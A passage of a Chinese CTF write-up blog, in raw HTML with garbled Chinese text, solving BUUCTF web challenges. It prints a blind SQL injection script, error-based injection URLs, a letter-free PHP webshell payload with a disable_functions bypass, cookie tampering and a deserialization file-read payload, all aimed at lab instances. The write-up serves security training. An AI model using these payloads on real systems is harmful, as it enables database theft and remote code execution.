class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;))from(H&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;rDsq&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))))%&lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;flag ç”¨ left å’Œ right å‡½æ•°æ‹¼æ¥&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019finalsql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019finalsql&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] FinalSQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;é¢˜ç›®æç¤ºç›²æ³¨ï¼Œæµ‹è¯• &lt;code&gt;/search.php?id=0^1&lt;/code&gt;  å¯ä»¥å‘ç°å­˜åœ¨ç›²æ³¨ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i,j&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;#payload = url + &amp;quot;0^(ascii(substr((database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j) =&amp;gt;&amp;#x27;geek&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&amp;#x27;geek&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;F1naI1y,Flaaaaag&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&amp;#x27;F1naI1y&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;id,username,password&amp;#x27;&lt;/span&gt;&lt;br&gt;	payload = url + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(i,j)&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;br&gt;	r = requests.get(payload)&lt;br&gt;	html = r.text&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Click&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; html:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;find&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	m1n = &lt;span class=&#34;hljs-number&#34;&gt;33&lt;/span&gt;&lt;br&gt;	m4x = &lt;span class=&#34;hljs-number&#34;&gt;126&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; m1n&amp;lt;=m4x:&lt;br&gt;		mid = (m1n+m4x)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; get(i,mid):&lt;br&gt;			m1n = mid+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;			m4x = mid-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;chr&lt;/span&gt;((m1n+m4x+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)&lt;br&gt;&lt;br&gt;flag = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1000&lt;/span&gt;):&lt;br&gt;	a = find(i)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a==&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;!&amp;#x27;&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;	flag += a&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(flag)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag:&amp;quot;&lt;/span&gt;,flag)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019buyflag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019buyflag&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] BuyFlag&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php&lt;/code&gt;  çœ‹åˆ°ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (is_numeric(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password can&amp;#x27;t be number&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;elseif&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;404&lt;/span&gt;) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;money=1e15&amp;amp;password=404aaa&lt;/code&gt;  åŒæ—¶ä¿®æ”¹ cookie çš„ user=0 å˜æˆ user=1 å³å¯æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019rce-me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019rce-me&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] RCE ME&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ— æ•°å­—ã€å­—æ¯ shellï¼Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/a15803617402/article/details/83589181&#34;&gt;https://blog.csdn.net/a15803617402/article/details/83589181&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/news/186298.html&#34;&gt;https://www.freebuf.com/news/186298.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ©ç”¨ LD_PRELOAD+without send_mail ç»•è¿‡ disable_functionsï¼Œè°ƒç”¨â€™/readflagâ€™æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ”¾ä¸ª payload&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;?code=&lt;span class=&#34;hljs-variable&#34;&gt;$_&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;&lt;/span&gt;^&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;&lt;/span&gt;;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[_](&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[__]);&amp;amp;_=assert&amp;amp;__=eval(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;])&amp;amp;cmd=&lt;span class=&#34;hljs-regexp&#34;&gt;/readflag&amp;amp;outpath=/&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;a&amp;amp;sopath=&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;tmp/disable.so&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2018fakebook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ç½‘é¼æ¯-2018fakebook&#34;&gt;#&lt;/a&gt; [ç½‘é¼æ¯ 2018] Fakebook&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1&lt;/code&gt;  å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œç”¨å•å¼•å·æµ‹è¯•å‘ç°æŠ¥é”™ã€‚æµ‹è¯•åå‘ç°æ˜¯æ•´å‹æ³¨å…¥ï¼Œå°è¯• &lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1&lt;/code&gt;  å’Œ &lt;code&gt;0^0&lt;/code&gt;  æ³¨å…¥æˆåŠŸ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è™½ç„¶å¯ä»¥ç›²æ³¨ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæ—¢ç„¶æœ‰æŠ¥é”™å°±å°è¯•æŠ¥é”™æ³¨å…¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)&lt;/code&gt;  æ‹¿åˆ°äº†æ•°æ®åº“å =&amp;gt;â€œfakebookâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)&lt;/code&gt;  æ‹¿åˆ°è¡¨å =&amp;gt;â€œusersâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)&lt;/code&gt;  æ‹¿åˆ°å­—æ®µå =&amp;gt;â€œno,username,passwd,dataâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)&lt;/code&gt;  æ‹¿æ•°æ®â€1ï¼Œm1n,3c9909afec25354d551dae21590bb2, &lt;code&gt;O:8:&amp;quot;UserInfo&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;m1n&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:6:&amp;quot;m1n.me&amp;quot;;&amp;#125;&lt;/code&gt; â€œï¼Œå‘ç°ä¸€æ®µååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ã€‚æ˜¯æˆ‘åˆšåˆšæ³¨å†Œçš„ä¿¡æ¯&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸å¤ªæ‡‚æœ‰å•¥ç”¨ï¼Œå°è¯•æ‰«åå°ï¼Œæ‰«åˆ° robots.txtï¼Œ/user.php.bak æ‹¿åˆ°æºç &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ„é€  &lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&amp;#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&amp;#125;%27&lt;/code&gt;  å°±å¯ä»¥è¯»åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;zjctf-2019nizhuansiwei&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zjctf-2019nizhuansiwei&#34;&gt;#&lt;/a&gt; [ZJCTF 2019]NiZhuanSiWei&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;)&amp;amp;&amp;amp;(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;welcome to the zjctf&amp;quot;&lt;/span&gt;))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;&lt;/span&gt;.file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Not now!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(); &lt;br&gt;    &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);  &lt;span class=&#34;hljs-comment&#34;&gt;//useless.php&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬ä¸€å±‚ä¸»è¦æ˜¯è€ƒå¯Ÿ php ä¼ªåè®®ï¼š &lt;code&gt;text=php://input&amp;amp;file=php://filter/read=convert.base64-encode/resource=useless.php&lt;/code&gt; , åŒæ—¶ POSTâ€welcome to the zjctfâ€œï¼Œå¯ä»¥æ‹¿åˆ° useless.php æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Flag&lt;/span&gt;&lt;/span&gt;&amp;#123;  &lt;span class=&#34;hljs-comment&#34;&gt;//flag.php  &lt;/span&gt;&lt;br&gt;    &lt;span 